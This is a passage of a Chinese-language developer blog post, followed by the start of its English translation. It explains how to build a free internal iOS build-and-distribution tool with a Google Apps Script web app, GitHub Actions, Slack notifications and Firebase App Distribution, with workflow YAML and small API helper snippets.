開發的後端服務，需要 App 工程師同時兼做後端、處理 Google 服務 OAuth 整合問題、部分功能可能在這做掉(例如：送審)…功能複雜；如果後來的新人沒銜接好這整塊幾乎沒辦法維護下去了，另外每個月還要花 $15 USD GCP 伺服器費用。初期也嘗試過用 FaaS 服務串接 Slack API，例如 Cloud Funtions，但是 Slack API 要求串接的服務要能在 3 秒內回應請求，否則視為失敗；FaaS 會有 冷啟動問題 ，當服務一段時間沒呼叫就會進入休眠，再次呼叫時會需要較長時間才能響應 (≥ 5秒)，會造成 Slack 打包表單很不穩定，時常出現 Timeout Error。整合進內部系統這當然是最優解，如果團隊有 Web、後端人力，直接與現有系統整合是最好也最安全的。 本文的前提是：沒有，App 自立自強。Google Apps Script — Web AppGoogle Apps Script 是我們的老夥伴，之前做過很多 RPA 專案都是用他去做排程觸發執行任務，例如：「 Crashlytics + Google Analytics 自動查詢 App Crash-Free Users Rate 」、「 使用 Google Apps Script 實現每日數據報表 RPA 自動化 」，這時候我又想起了它；GAS 有一個功能是部署成 Web (App) 直接當網頁服務。Google Apps Script 優點： ✅ 免費、 正常使用下幾乎摸不到上限 ✅ Functions as a Service 方法即服務，不需自行架設維護伺服器 ✅ 權限控管同 Google Workspace，可設定僅限組織內 Google 帳號使用 ✅ 無痛整合 Google 生態系相關服務(e.g. Firebase, GA…etc)與資料 (不用自己做 OAuth) ✅ 程式語言使用 JavaScript 易上手 (V8 Runtime 支援 ES6+ ) ✅ 快速撰寫、快速上線、快速使用 ✅ 服務穩定、長久 (已推出超過 16 年) ✅ AI Can Help! 實測使用 ChatGPT 輔助開發，準確率可達 95%Google Apps Script 缺點： ❌ 內建的版本管控一言難盡 ❌ 內建不支援檔案、資料儲存、金鑰/憑證管理 ❌ Web App 無法做到 100% 體驗的 RWD ❌ 專案只能綁在個人帳號而不是組織 ❌ 雖然 Google 有持續在開發維護，但整體功能更新緩慢 ❌ 網路請求 UrlFetchApp 不支援設定 User-Agent ❌ Web App doGet / doPost 不支援取得 Headers 資訊 ❌ FaaS 冷啟動問題 ❌ 不支援多人同時開發 但在 Web App 影響不大，頂多要多等幾秒才進入網頁。以上是 GAS 本身服務的優缺點，對做打包工具 Web 影響不大；選擇使用此方案對比 Slack 方案，更快速、輕量跟容易交接上手， 缺點是團隊需要多知道這個工具的網址在哪跟怎麼用、還有因 GAS 程式庫功能有限 (e.g. 無內建加密演算法庫) 基本上只能做純中繼平台，例如送審，那也只能轉發送審請求請 GitHub Actions 做。 另外也僅適用是 Google Workspace 工作環境的團隊； 權衡了資源與需求，因此採用 Google Apps Script — Web App 來實現打包工具平台。UI Framework我們直接使用 Bootstrap CDN，不然要自己弄 CSS 樣式太麻煩了，Bootstrap 問 AI 怎麼組合使用也更準確方便。動手做這邊已經把整個平台架構開源了，大家可以依照自己團隊的需求基於這個版本再客製化即可。開源範例專案在 GAS 上直接檢視專案：Google Drive: Sign-in Access Google Drive with a Google account (for personal use) or Google Workspace account (for business use) . script.google.comGitHub Repo 備份：檔案架構寫了一個很陽春的 類-MVC 架構，如要調整或不知道功能問 AI 都能得到準確答案。系統 appsscript.json: GAS 系統的 Metadata 設定檔案重點是「oauthScopes」變數，宣告這個 Script 會用到的外部權限。 Entrypoint.gs: 定義 doGet( ) 進入點Controller Controller_iOS.gs: iOS 打包工具頁面 Controller，負責撈數據給 View 顯示View View_index.html: 整個打包工具骨架、首頁 View_iOS.html: iOS 打包工具頁面骨架 View_iOS_Runs.html: iOS 打包工具 — 打包紀錄內容頁面 View_iOS_Form.html: iOS 打包工具 —打包表單頁面 View_iOS_Runners.html: iOS 打包工具 — Self-hosted Runner 狀態頁面Model(Lib) Credentials.gs: 定義金鑰內容(⚠️️️請注意️，GAS 如果要走 GCP IAM 會蠻複雜的因此我們直接定義金鑰在此， 所以這個 GAS 專案會包含機密資訊，請不要隨意共享專案檢視編輯權限 ) StubData.gs: Online Demo 用的 Stub 方法、資料。 Settings.gs: 一些常用設定，跟 lib init。 GitHub.gs: GitHub API 操作封裝。 Slack.gs: Slack API 操作封裝。 Firebase.gs: Firebase — App Distribution API 操作封裝。建立自己的打包平台1.建立一個 Google Apps Script 專案 、命名到專案設定 → 勾選「在編輯器中顯示「appsscript.json」資訊清單檔案」才會出現「appsscript.json」Metadata 檔案。2.參考我的 開源專案檔案 ，把所有檔案按照範例建立好跟把內容無腦複製過來 很蠢，但沒辦法。 StubData.gs 先一起複製過來，第一次部署測試可以使用。 另一個方法是用 clasp (Google Apps Script CLI) git clone demo project 後把 Code 推上去。複製完長得會跟範例專案一模一樣。3. 首次部署「網頁應用程式」查看結果專案右上角「部署」 → 「新增部署作業」 → 類型「網頁應用程式」:執行身份： 我 統一都用你的帳號身分執行腳本。 存取網頁程式的使用者 會以當前登入的 Google 帳號使用者身份執行腳本。誰可以存取： 只有我自己 XXX 同個組織中的所有使用者 只有同組織＋已登入的 Google 帳號使用者可以存取。 所有已登入 Google 帳號的使用者 已登入的 Google 帳號使用者都可以存取。 所有人 不需要登入 Google 帳號、所有人都可以公開存取。 如果是內部工具：可以選擇「 誰可以存取：XXX 同個組織中的所有使用者」+「執行身份：存取網頁程式的使用者」進行安全控管。完成部署後的「網頁應用程式」網址，就是你的 Web App 打包工具網址，可以分享給團隊成員使用。(網址很醜，可以自己用短網址服務包裝一下、 更新部署內容不會異動網址 )使用者首次使用需要同意授權首次點擊 Web App 網址，需要先同意授權。 Review Permission → 選擇要使用此 Web App 的帳戶身份 未驗證警告視窗，點擊「進階」展開 → 點擊 前往「XXX」(不安全) 點擊「允許」 爾後如果腳本權限沒更動不用重新授權。完成授權同意後就會進入打包工具首頁： Demo 打包工具部署成功 🎉🎉🎉註:「這個應用程式是由 Google Apps Script 的使用者建立」這個提示無法自動隱欌。更新部署 ⚠️所有程式碼的變動都需要更新部署才會生效。 ️️⚠️所有程式碼的變動都需要更新部署才會生效。 ⚠️所有程式碼的變動都需要更新部署才會生效。這邊要注意程式碼變動儲存完不會直接變動到 Web App 上，所以發現重整沒效果就是這個原因； 需要到「部署」 → 「管理部署作業」→「編輯」→ 版本「建立新版本」 → 點擊「部署」 → 「完成」 。 更新部署完再重整網頁就能看到改動生效。新增測試部署方便開發如同前述，所有改動要生效都要更新部署；這在開發階段非常麻煩，因此在開發階段我們可以用「測試部署」來快速驗證改動是否正確。到「部署」 → 「測試部署作業」 → 取得測試用「網頁應用程式」網址。在開發階段我們直接使用此網址就能儲存，檔案更改儲存完，回到這個開發用網址重整網頁就能看到成果！ 都開發好之後再照前文說的更新部署，釋出給使用者使用。修改 Demo 範例專案串接真實資料再來才是重點，串接真實資料，GitHub Actions Workflow 參考的是 上一篇文章中建立好的 CI/CD 流程 ，你也可依照實際的 Actions Workflow 調整參數。⚠️修改前請注意Google Apps Script 平台並不能很好的支援多人或甚至多開視窗開發，我自己踩過的雷是不小心開了兩個編輯視窗，在 A 編輯完，後來在 B 編輯，所以修改都被 B 的舊版覆蓋掉了；因此 建議同時間只有一個人一個視窗在編輯 Script 。GitHub 串接帶入 GitHub API Token:GitHub -&gt; 帳號 -&gt; Settings -&gt; Developer Settings -&gt; Fine-grained personal access tokens or Personal access tokens (classic)。建議使用 Fine-grained personal access tokens 比較安全(但有期限)。Fine-grained personal access tokens 需要的權限如下： Repo: 記得選要操作的 Repo Permissions: Actions (read/write) 、 Administration (read only) 如果不想依賴在某人的帳號上建議建立一支乾淨的團隊 GitHub 帳號，使用它的 Token。到 GAS 專案 → Credentials.gs → 將 Token 帶入到 githubToken 變數中。替換 GithubStub 成 GitHub:到 GAS 專案 → Settings.gs → 將：const iOSGitHub = new GitHubStub(githubToken, iOSRepoPath);改成const iOSGitHub = new GitHub(githubToken, iOSRepoPath);儲存檔案。重新整理測試用「網頁應用程式」網址查看改動是否正確: 能正確顯示資料代表： GitHub 改串真實資料成功 🎉🎉🎉也能順手切到「Runner 狀態」查看 Self-hosted Runner 狀態撈取正不正常：註：我 Runner 沒開…所以是離線中。Slack 串接為了串接 Slack 通知，我們首先要回到 Repo → GitHub Actions 新增一個包裹打包 Action Workflow 的通知容器 Action。CD-Deploy-Form.yml:# Workflow(Action) 名稱name: CD-Deploy-Form# Actions Log 的標題名稱run-name: \"[CD-Deploy-Form] ${{ github.ref }}\"# 同個 Concurrency Group 如果有新的 Job 會取消正在跑的# 例如 重複觸發相同分支的打包任務，會取消前一個任務concurrency: group: ${{ github.workflow }}-${{ github.ref }} cancel-in-progress: true# 觸發事件on: # 手動表單觸發 workflow_dispatch: # 表單 Inputs 欄位 inputs: # App 版本號 VERSION_NUMBER: description: 'Version Number of the app (e.g., 1.0.0). Auto-detect from the Xcode project if left blank.' required: false type: string # App Build Number BUILD_NUMBER: description: 'Build number of the app (e.g., 1). Will use a timestamp if left blank.' required: false type: string # App Release Note RELEASE_NOTE: description: 'Release notes of the deployment.' required: false type: string # 觸發者的 Slack User ID SLACK_USER_ID: description: 'Slack user id.' required: true type: string # 觸發者的 Email AUTHOR: description: 'Trigger author email.' required: true type: string # Job 工作項目jobs: # 開始打包時傳送 Slack 訊息 # Job ID start-message: # 小工作直接用 GitHub Hosted Runner 跑，用量不大 runs-on: ubuntu-latest # 設定最長 Timeout 時間，防止異常情況發生時無止盡的等待 # 正常情況不可能跑超過 5 分鐘 timeout-minutes: 5 # 工作步驟 steps: - name: Post a Start Slack Message id: slack uses: slackapi/slack-github-action@v2.0.0 with: method: chat.postMessage token: ${{ secrets.SLACK_BOT_TOKEN }} payload: | channel: ${{ inputs.SLACK_USER_ID }} text: \"已收到打包請求。\\nID: &lt;${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}|${{ github.run_id }}&gt;\\nBranch: ${{ github.ref_name }}\\ncc'ed &lt;@${{ inputs.SLACK_USER_ID }}&gt;\" # Job Output 給後續 Job 使用 # ts = Slack 訊息 ID，後續通知才可以 Reply 在同個 Threads outputs: ts: ${{ steps.slack.outputs.ts }} deploy: # Job 預設是並發執行，用 needs 限制需等待 start-message 完成才執行 # 執行打包部署任務 needs: start-message uses: ./.github/workflows/CD-Deploy.yml secrets: inherit with: VERSION_NUMBER: ${{ inputs.VERSION_NUMBER }} BUILD_NUMBER: ${{ inputs.BUILD_NUMBER }} RELEASE_NOTE: ${{ inputs.RELEASE_NOTE }} AUTHOR: ${{ inputs.AUTHOR }} # 打包部署任務成功訊息 end-message-success: needs: [start-message, deploy] if: ${{ needs.deploy.result == 'success' }} runs-on: ubuntu-latest timeout-minutes: 5 steps: - name: Post a Success Slack Message uses: slackapi/slack-github-action@v2.0.0 with: method: chat.postMessage token: ${{ secrets.SLACK_BOT_TOKEN }} payload: | channel: ${{ inputs.SLACK_USER_ID }} thread_ts: \"${{ needs.start-message.outputs.ts }}\" text: \"✅ 打包部署成功。\\n\\ncc'ed &lt;@${{ inputs.SLACK_USER_ID }}&gt;\" # 打包部署任務失敗訊息 end-message-failure: needs: [deploy, start-message] if: ${{ needs.deploy.result == 'failure' }} runs-on: ubuntu-latest timeout-minutes: 5 steps: - name: Post a Failure Slack Message uses: slackapi/slack-github-action@v2.0.0 with: method: chat.postMessage token: ${{ secrets.SLACK_BOT_TOKEN }} payload: | channel: ${{ inputs.SLACK_USER_ID }} thread_ts: \"${{ needs.start-message.outputs.ts }}\" text: \"❌ 打包部署失敗，請檢查執行狀況結果或稍後再試。\\n\\ncc'ed &lt;@${{ inputs.SLACK_USER_ID }}&gt;\" # 打包部署任務取消訊息 end-message-cancelled: needs: [deploy, start-message] if: ${{ needs.deploy.result == 'cancelled' }} runs-on: ubuntu-latest timeout-minutes: 5 steps: - name: Post a Cancelled Slack Message uses: slackapi/slack-github-action@v2.0.0 with: method: chat.postMessage token: ${{ secrets.SLACK_BOT_TOKEN }} payload: | channel: ${{ inputs.SLACK_USER_ID }} thread_ts: \"${{ needs.start-message.outputs.ts }}\" text: \":black_square_for_stop: 打包部署已取消。\\n\\ncc'ed &lt;@${{ inputs.SLACK_USER_ID }}&gt;\"完整程式碼： CD-Deploy-Form.yml這個 Action 只是個容器，串接 Slack 通知，實際是復用 上一篇文章 中寫好的 CD-Deploy.yml Action。 Slack Bot App 建立、發訊息權限設定可參考我 之前的文章 記得到 Repo → Secrets 新增對應的 SLACK_BOT_TOKEN 跟帶入 Slack Bot App Token 值回到 GAS 專案 → Credentials.gs → 將 Token 帶入到 slackBotToken 變數中。再到 GAS 專案 → Settings.gs → 將：const slack = new SlackStub(slackBotToken);改成const slack = new Slack(slackBotToken);儲存檔案。 如果你沒有現成的 Slack Bot App 可發通知也懶得建立，可以忽略這裡的所有步驟，並刪除 GAS 專案中有關 slack 的使用。GitHub 串接 — 打包表單到 GAS 專案 → Controller_iOS.gs → 調整 View_iOS_Form.html 內容:移除假 Asana Tasks 串接方法： &lt;? tasks.forEach(function(task) { ?&gt; &lt;option value=\"&lt;?=task.githubBranch?&gt;\"&gt;[&lt;?=task.id?&gt;] &lt;?=task.title?&gt;&lt;/option&gt; &lt;? }) ?&gt;也可以在這邊自己調整預設分支(這邊是 main )。—到 GAS 專案 → Controller_iOS.gs → 調整 iOSLoadForm() 內容: 移除 template.tasks = Stubable.fetchStubAsanaTasks(); 這行假串接 Asana 的方法。如果要串 Asana/Jira 可以直接問 ChatGPT 請他幫忙產串接方法。 template.prs = iOSGitHub.fetchOpenPRs(); 是真的串 GitHub API 拿 Opened PR List，可依需求保留。送出後的處理 在 iOSSubmitForm() 內容:可依照實際 GitHub Actions Workflow 檔案名稱、 workflow_dispatch inputs 欄位參數進行調整： iOSGitHub.dispatchWorkflow(\"CD-Deploy-Form.yml\", branch, { \"BUILD_NUMBER\": buildNumber, \"VERSION_NUMBER\": versionNumber, \"VERSION_NUMBER\": versionNumber, \"RELEASE_NOTE\": releaseNote, \"AUTHOR\": email, \"SLACK_USER_ID\": slack.fetchUserID(email) });也可以加入自己的必填條件驗證，這邊只驗證一定要填分支，不然會跳錯誤訊息。如果認為這樣不夠安全可以自己再加入密碼驗證或只有特殊帳號可以使用。 最後一行 Slack 通知功能需要設定好 Slack ，如果沒有 Slack Bot App 或懶得串接 Slack，在 Demo Actions Repo 中可以直接改用 iOSGitHub.dispatchWorkflow(\"CD-Deploy.yml\") 然後移除掉 SLACK_USER_ID 參數即可。重新整理測試用「網頁應用程式」網址查看改動是否正確：可以看到打包表單就只剩 Opened PR List 了。填好資料按「送出請求」測試看看打包表單：提示送出成功代表沒問題，回到打包紀錄也能看到任務開始執行了 🎉 ： 重複點打包紀錄能更新進度。常見送出錯誤： Required input ‘SLACK_USER_ID’ not provided : GitHub Actions 這個SLACK_USER_ID 欄位為必填，但沒有帶，可能是 Slack 設定失敗、當前 User Email 找不到對應的 Slack UID。 Workflow does not have ‘workflow_dispatch’ trigger 、 分支過舊，請更新 xxx 分支 : 選擇的分支找不到對應的 Action Workflow 檔案(iOSGitHub.dispatchWorkflow 指定的檔案)。 No ref found for 、 找不到分支 : 找不到此分支。Firebase App Distribution — 取得下載連結串接最後一個小功能是串接 Firebase App Distribution 直接取得下載資訊跟連結，方便在手機上開啟打包平台工具點擊直接下載安裝。 之前介紹過「 Google Apps Script x Google APIs 快速串接整合方式 」GAS 能快速無痛整合 Firebase。串接原理 在串接之前先講一下這個「Tricky」的串接原理。我們的打包平台是沒有資料庫的，純做 API 中繼站；所以實際上是我們在 GitHub Acitons CD-Deploy.yml 打包作業時，把 Job Run ID 帶入到 Release Note (當然也可以帶到 Build Number)：ID=\"${{ github.run_id }}\" // Job Run IDCOMMIT_SHA=\"${{ github.sha }}\"BRANCH_NAME=\"${{ github.ref_name }}\"AUTHOR=\"${{ env.AUTHOR }}\"# 組合 Release NoteRELEASE_NOTE=\"${{ env.RELEASE_NOTE }}ID: ${ID}Commit SHA: ${COMMIT_SHA}Branch: ${BRANCH_NAME}Author: ${AUTHOR}\"# 執行 Fastlane 打包＆部署 Lanebundle exec fastlane beta release_notes:\"${RELEASE_NOTE}\" version_number:\"${VERSION_NUMBER}\" build_number:\"${BUILD_NUMBER}\"這樣 Firebase App Distribution Release Notes 就會有 Job Run ID。GAS Web App 打包工具平台會串 GitHub API 取得 GitHub Actions 執行紀錄我們直接用 API 給的 Job Run ID 帶到 Firebase App Distribution API 查詢 Release Notes 中有包含 *ID: XXX* 的版本，就能找到對應的打包紀錄了。不用任何資料庫也能做到兩個工具平台的對應。串接專案設定到 GAS → 專案設定 → Google Cloud Platform (GCP) 專案 → 變更專案：輸入想串接的 Firebase 專案編號。 初次設定可能會跳錯誤 「如要變更專案，請設定 OAuth 同意畫面。設定 OAuth 同意畫面詳細資料。」沒有的話可跳過以下步驟。點擊「OAuth 同意畫面詳細資料」連結 → 點擊「設定同意畫面」：點擊「開始」:應用程式資訊: 應用程式名稱: 輸入你的工具名稱 使用者支援電子郵件: 選擇電子郵件目標對象: 內部：僅限組織內部夥伴使用 外部：所有 Google 帳戶使用者都能同意授權後使用聯絡資訊: 輸入接收通知用電子郵件勾選同意《 Google API 服務：使用者資料政策 》。最後點擊「 建立 」。—回到 GAS → 專案設定 → Google Cloud Platform (GCP) 專案 → 變更專案：再次輸入 Firebase 專案編號點擊「變更專案」。沒出現錯誤就是完成綁定了。—如果選擇的是「外部」可能還需要完成以下設定：點擊「專案編號」 → 展開左側欄 → 「API 和服務」→ 「OAuth 同意畫面」選擇「目標對象」 → 測試 點擊「發布應用程式」→ 完成。 使用者就能照前文的「 使用者首次使用需要同意授權 」步驟完成授權就能使用了！如果上述步驟沒設定，使用者會遇到以下錯誤：已封鎖存取權「XXX」未完成 Google 驗證程序— — —串接專案回到串接上，Firebase 是直接用 ScriptApp.getOAuthToken() 依照執行身份動態取得 Token 使用，因此不需要設定 Token。只需要到 GAS 專案 → Settings.gs → 將：const iOSFirebase = new FirebaseStub(iOSFirebaseProject);改成const iOSFirebase = new Firebase(iOSFirebaseProject);即可。重新整理測試用「網頁應用程式」網址到打包紀錄 → 找一筆紀錄點擊「取得下載連結」：如果有在 Firebase App Distribution Release Notes 找到對應的 Job Run Id 打包，就會直接顯示下載資訊跟點下載能直接導到下載頁。 完成！🎉🎉🎉成果至此你已經把範例都改成您的實際可用的打包工具，剩下的客製化功能、更多第三方 API 串接、更多表單可以自行延伸 (跟 ChatGPT 討論)。 最後不要忘記都開發好測試完畢要上線，需要照前文步驟 — 更新部署作業才會生效喔！串接延伸延續我們「中繼站」角色的精神，這邊提供幾個快速串接的 CheatSheet：Asana API — 取得 Tasks:function asanaAPI(endPoint, method = \"GET\", data = null) { var options = { \"method\" : method, \"headers\": { \"Authorization\": \"Bearer \"+asanaToken }, \"payload\" : data }; var url = \"https://app.asana.com/api/1.0\"+endPoint; var res = UrlFetchApp.fetch(url, options); var data = JSON.parse(res.getContentText()); return data;}asanaAPI(\"/projects/{project_gid}/tasks\")Jira API — 取得 Tickets (JQL):// jql = 篩選條件function jiraTickets(jql) { const url = `https://xxx.atlassian.net/rest/api/3/search`; const maxResults = 100; let allIssues = []; let startAt = 0; let total = 0; do { const queryParams = { jql: jql, startAt: startAt, maxResults: maxResults, fields: \"assignee,summary,status\" }; const queryString = Object.keys(queryParams) .map(key =&gt; `${encodeURIComponent(key)}=${encodeURIComponent(queryParams[key])}`) .join(\"&amp;\"); const options = { method: \"get\", headers: { Authorization: \"Basic \" + jiraToken, \"Content-Type\": \"application/json\", }, muteHttpExceptions: true, }; const response = UrlFetchApp.fetch(`${url}?${queryString}`, options); const json = JSON.parse(response.getContentText()); if (response.getResponseCode() != 200) { throw new Error(\"Failed to fetch Jira issues.\"); } if (json.issues &amp;&amp; json.issues.length &gt; 0) { allIssues = allIssues.concat(json.issues); total = json.total; startAt += json.issues.length; } else { break; } } while (startAt &lt; total); var groupIssues = {}; for(var i = 0; i &lt; allIssues.length; i++) { const issue = allIssues[i]; if (groupIssues[issue.fields.status.name] == null) { groupIssues[issue.fields.status.name] = []; } groupIssues[issue.fields.status.name].push(issue); } return groupIssues;}jiraTickets(`project IN(App)`);如果真的需要資料庫，可以使用 Google Sheet 代替：class Saveable { constructor(type) { // https://docs.google.com/spreadsheets/d/Sheet-ID/edit const spreadsheet = SpreadsheetApp.openById(\"Sheet-ID\"); this.sheet = spreadsheet.getSheetByName(\"Data\"); // Sheet Name this.type = type; } write(key, value) { this.sheet.appendRow([ this.type, key, JSON.stringify(value) ]); } read(key) { const data = this.sheet.getDataRange().getValues(); const row = data.find(r =&gt; r[0] === this.type &amp;&amp; r[1] === key); if (row) { return JSON.parse(row[2]); } return null; }}let saveable = Saveable(\"user\");// Writesaveable.write(\"birthday_zhgchgli\", \"0718\");// Readsaveable.read(\"birthday_zhgchgli\"); // -&gt; 0718Slack API &amp; 發送訊息方法：function slackSendMessage(channel, text = \"\", blocks = null) { const content = { channel: channel, unfurl_links: false, unfurl_media: false, text: text, blocks: blocks }; try { const response = slackRequest(\"chat.postMessage\", content); return response; } catch (error) { throw new Error(`Failed to send Slack message: ${error}`); }}function slackRequest(path, content) { const options = { method: \"post\", contentType: \"application/json\", headers: { Authorization: `Bearer ${slackBotToken}`, 'X-Slack-No-Retry': 1 }, payload: JSON.stringify(content) }; try { const response = UrlFetchApp.fetch(\"https://slack.com/api/\"+path, options); const responseData = JSON.parse(response.getContentText()); if (responseData.ok) { return responseData } else { throw new Error(`Slack: ${responseData.error}`); } } catch (error) { throw error; }}更多 Google Apps Script 案例： Google Apps Script x Google APIs 快速串接整合方式 簡單 3 步驟 — 打造免費 GA4 自動數據通知機器人 使用 Google Apps Script 實現每日數據報表 RPA 自動化 Slack &amp; ChatGPT Integration 使用 Google Apps Script 三步驟免費建立 Github Repo Star Notifier Crashlytics + Google Analytics 自動查詢 App Crash-Free Users Rate Crashlytics + Big Query 打造更即時便利的 Crash 追蹤工具總結感謝您的耐心閱讀與參與，CI/CD 從 0 到 1 系列文章到此告一段落；希望能實際幫助到您與您的團隊建置完善的 CI/CD 工作流程，提升效率與產品穩定性；有任何實作問題歡迎留言討論，這四篇文章大約花了 14+ 天撰寫， 如果您覺得不錯歡迎 Follow 我的 Medium 和與朋友同事分享 。 謝謝。Buy me a coffee 本系列文章花費了大量的時間精力撰寫，如果內容對您有幫助、對您的團隊有實質提升工作效率與產品品質；歡迎請我喝杯咖啡，感謝支持！Buy me a coffee系列文章： CI/CD 實戰指南（一）：CI/CD 是什麼？如何透過 CI/CD 打造穩定高效的開發團隊？工具選擇？ CI/CD 實戰指南（二）：GitHub Actions 與 self-hosted Runner 使用與建置大全 CI/CD 實戰指南（三）：使用 GitHub Actions 實作 App 專案的 CI 與 CD 工作流程 CI/CD 實戰指南（四）：使用 Google Apps Script Web App 串接 GitHub Actions 建置免費易用的打包工具平台有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 84 Total Views Last Statistics Date: 2025-08-15 | 72 Views on Medium." }, { "title": "CI/CD Practical Guide (Part 4): Building a Free and User-Friendly Packaging Tool Platform with Google Apps Script Web App and GitHub Actions", "url": "/posts/zrealm-dev/en/ci-cd-practical-guide-part-4-building-a-free-and-user-friendly-packaging-tool-platform-with-google-apps-script-web-app-and-github-actions-4273e57e7148/", "categories": "ZRealm Dev.", "tags": "ios-app-development, cicd, google-apps-script, web-development, tools", "date": "2025-07-10 20:30:51 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版CI/CD Practical Guide (Part 4): Building a Free and User-Friendly Packaging Tool Pla...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版CI/CD Practical Guide (Part 4): Building a Free and User-Friendly Packaging Tool Platform with Google Apps Script Web App and GitHub ActionsIntegrating GAS Web App with GitHub, Slack, Firebase, or Asana/Jira API to create a relay station that provides a packaging tool platform for cross-team sharing.Photo by Lee CampbellIntroductionIn the previous article, “CI/CD Practical Guide (Part 3): Implementing iOS CI and CD Workflows with GitHub Actions,” we completed the foundational features for the CI/CD of the iOS app project. We can now perform CI automated testing and CD packaging deployment. However, in practical product development processes, packaging and deployment tasks are often meant for subsequent delivery to other functional partners for QA (Quality Assurance) validation. At this point, the CD scenario is no longer limited to the engineering side; it may involve QA, PM, design (Design QA), or even the boss wanting to take a look first.The GitHub Actions workflow_dispatch manual form trigger event provides a simple form for users to operate packaging, but if the target users are non-engineers, it can be quite unfriendly. They may not understand: What is a branch? Do I need to fill in the fields? How do I know when the packaging is done? How do I download it? …etc. Additionally, there are permission control issues. If we want other functional partners to use GitHub Actions for packaging directly, we need to add their accounts to the repo, which is not secure or reasonable from a cybersecurity perspective; just to operate the packaging form, we have to expose the entire source code to them.Unlike Jenkins, which has an independent web tool platform, GitHub Actions only has this functionality.workflow_dispatch form styleTherefore, we need a relay station packaging platform to serve other functional users, integrating Asana/Jira task lists so that users can package the app directly using the task list and view progress and download packaging results right there.GAS Web App Relay StationThe previous article focused on the core GitHub Actions CI/CD workflow development on the right side; this article focuses on the left side, the end-user packaging tool platform, enhancing user experience.Google Apps Script — Web App Packaging Tool Platform Results Packaging Form: Integrates project management tools to fetch task numbers and integrates GitHub to fetch open Pull Requests. Packaging Records: Displays packaging history, current task progress status, and provides download links for Firebase App Distribution. Runner Status: Displays the status of the self-hosted runner. Slack Packaging Progress Notifications. Mobile version support. Supports restricting usage to accounts within the organization.Main Responsibilities0 status, 0 database, purely a relay exchange station, integrating and displaying data from various APIs (e.g., Asana/Jira/GitHub) and forwarding form requests to GitHub Actions.Operational Requirements: Supports both mobile and desktop.Permission Requirements: Can restrict access to only team organization members.Online Demo Web AppSign in Edit description script.google.comTechnology ChoicesThe first article mentioned this, and here’s a detailed summary again.Integration with SlackWe attempted to use Slack as the packaging platform, developing our backend service and hosting it on GCP, integrating with Slack API and Asana API, and then forwarding the forms sent from Slack to GitHub API to trigger subsequent GitHub Actions. The experience was very smooth and unified within the team’s collaboration tools, allowing for seamless usage; the downside is that the development and subsequent maintenance costs are very high, as we developed the backend service using Ktor, requiring app engineers to also handle backend tasks, manage Google service OAuth integration issues, and some functions might be complex (e.g., submission for review). If new team members do not properly transition this part, it becomes nearly impossible to maintain. Additionally, there is a monthly cost of $15 USD for GCP server fees.Initially, we also tried using FaaS services to integrate with Slack API, such as Cloud Functions, but the Slack API requires the integrated service to respond within 3 seconds; otherwise, it is considered a failure. FaaS can have cold start issues, where if the service has not been called for a while, it goes into sleep mode, and the next call takes longer to respond (≥ 5 seconds), leading to instability in the Slack packaging form and frequent Timeout Errors.Integration with Internal SystemsThis is certainly the optimal solution. If the team has web and backend personnel, directly integrating with existing systems is the best and safest approach. The premise of this article is: No, the app stands on its own.Google Apps Script — Web AppGoogle Apps Script is our old friend; we have previously completed many RPA projects using it to schedule and trigger tasks, such as “Crashlytics + Google Analytics Automatic Query for App Crash-Free Users Rate” and “Using Google Apps Script to Implement Daily Data Report RPA Automation.” This time, I remembered it again; GAS has a feature that allows deployment as a Web (App) to serve as a web service.Advantages of Google Apps Script: ✅ Free, under normal usage, you hardly hit the limits ✅ Functions as a Service, no need to set up and maintain servers. ✅ Permission control similar to Google Workspace, allowing access only to Google accounts within the organization. ✅ Seamless integration with Google ecosystem services (e.g., Firebase, GA, etc.) and data (no need to handle OAuth yourself). ✅ Programming language is JavaScript, easy to learn (V8 Runtime supports ES6+). ✅ Quick to write, deploy, and use. ✅ Stable and long-lasting service (has been available for over 16 years). ✅ AI Can Help! Tested using ChatGPT for development assistance, achieving an accuracy rate of up to 95%.Disadvantages of Google Apps Script: ❌ Built-in version control is lacking. ❌ Built-in support for file, data storage, and key/certificate management is absent. ❌ Web App cannot achieve 100% responsive web design. ❌ Projects can only be tied to personal accounts, not organizations. ❌ Although Google continues to develop and maintain it, overall feature updates are slow. ❌ Network requests UrlFetchApp do not support setting User-Agent. ❌ Web App doGet / doPost do not support retrieving header information. ❌ FaaS cold start issues. ❌ Does not support simultaneous development by multiple users.However, this has little impact on the Web App; at most, you may have to wait a few extra seconds to enter the webpage.The above are the pros and cons of GAS itself, which have little impact on creating the packaging tool web. Choosing this solution compared to the Slack option is faster, lighter, and easier to hand over. The downside is that the team needs to be aware of where the tool’s URL is and how to use it, and due to the limited functionality of GAS libraries (e.g., no built-in encryption algorithm library), it can essentially only serve as a pure relay platform, such as for submission, which can only forward submission requests to GitHub Actions. Additionally, it is only suitable for teams in a Google Workspace environment; balancing resources and needs, we chose Google Apps Script — Web App to implement the packaging tool platform.UI FrameworkWe directly use Bootstrap CDN; otherwise, creating CSS styles would be too troublesome. Asking AI how to combine and use Bootstrap is also more accurate and convenient.Getting StartedThe entire platform architecture has been open-sourced, and everyone can customize it based on their team’s needs from this version.Open Source Example ProjectView the project directly on GAS:Google Drive: Sign-in Access Google Drive with a Google account (for personal use) or Google Workspace account (for business use). script.google.comGitHub Repo Backup:File StructureI wrote a very basic pseudo-MVC structure. If you need to adjust or are unsure about functionality, you can ask AI for accurate answers.System appsscript.json: GAS system metadata configuration file.The key point is the “oauthScopes” variable, which declares the external permissions this script will use. Entrypoint.gs: Defines the entry point for doGet().Controller Controller_iOS.gs: iOS packaging tool page controller, responsible for fetching data for the view to display.View View_index.html: The skeleton of the entire packaging tool, homepage. View_iOS.html: The skeleton of the iOS packaging tool page. View_iOS_Runs.html: iOS packaging tool — packaging record content page. View_iOS_Form.html: iOS packaging tool — packaging form page. View_iOS_Runners.html: iOS packaging tool — self-hosted runner status page.Model (Lib) Credentials.gs: Defines key content.(⚠️️️Please note, if GAS is to use GCP IAM, it can be quite complex, so we directly define the keys here. This GAS project will contain confidential information, so please do not share project view/edit permissions casually.) StubData.gs: Stub methods and data for the online demo. Settings.gs: Some common settings and lib 